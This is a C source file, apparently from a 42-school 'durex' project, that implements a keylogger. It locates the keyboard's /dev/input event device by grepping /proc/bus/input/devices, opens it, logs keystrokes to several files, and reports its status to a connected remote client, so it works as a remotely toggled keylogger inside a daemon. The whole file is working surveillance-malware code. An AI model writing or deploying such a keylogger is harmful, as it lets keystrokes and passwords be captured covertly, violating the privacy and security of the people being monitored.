/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   keylog.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/20 18:32:14 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 19:28:36 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include "fcntl.h"

static char			*get_keyboard_device(void)
{
	char	result[40];
	char	tmp[20];
	FILE	*pipe;
	static const char	*cmd =
	"grep -E 'Handlers|EV' /proc/bus/input/devices |"
	"grep -B1 120013 |"
	"grep -Eo event[0-9]+ |"
	"tr '\\n' '\\0'";

	if (!(pipe = popen(cmd, "r")))
		return (NULL);
	ft_bzero(result, 40);
	ft_strcat(result, "/dev/input/");
	fgets(tmp, 20, pipe);
	pclose(pipe);
	ft_strcat(result, tmp);
	return (ft_strdup(result));
}

static int		keylog_error(t_durex *durex, int co, char *msg)
{
	durex_log(durex, msg, "ERROR");
	if (co >= 0)
		message_client(durex, co, msg);
	keylog_stop(durex);
	return (1);
}

static int		keylog_success(t_durex *durex, int co)
{
	if (durex->kl.keylogging)
	{
		log_info(durex, "Started keylogging\n");
		if (co >= 0)
			message_client(durex, co, "Started keylogging\n");
	}
	else if (co >= 0)
		message_client(durex, co, "Stopped keylogging\n");
	return (1);
}

static int		keylog_open_files(t_durex *durex)
{
	durex->kl.keylog_log = open(KEYLOG_PATH,
		O_CREAT | O_WRONLY | O_APPEND, 0700);
	durex->kl.kl.log = open(KEYLOG_PARSE_PATH,
		O_CREAT | O_WRONLY | O_APPEND, 0700);
	durex->kl.simple.log = open(KEYLOG_PARSE_SIMPLE_PATH,
		O_CREAT | O_WRONLY | O_APPEND, 0700);
	if (durex->kl.keylog_log < 0 && durex->kl.kl.log < 0 &&
		durex->kl.simple.log < 0)
		return (0);
	return (1);
}

int				keylog(t_durex *durex, int co)
{
	char	*device;

	durex->kl.keylogging = !durex->kl.keylogging;
	if (durex->kl.keylogging)
	{
		if (!keylog_open_files(durex))
			return (keylog_error(durex, co, "Could not open keylog logs\n"));
		if (!(device = get_keyboard_device()))
			return (keylog_error(durex, co, "Could not get keyboard device\n"));
		if ((durex->kl.keyboard_device = open(device, O_RDONLY)) < 0)
		{
			free(device);
			return (keylog_error(durex, co, "Could not open keyboard device\n"));
		}
		free(device);
		durex->clients[durex->kl.keyboard_device].type = FD_KEYLOG;
	}
	else
		keylog_stop(durex);
	return (keylog_success(durex, co));
}
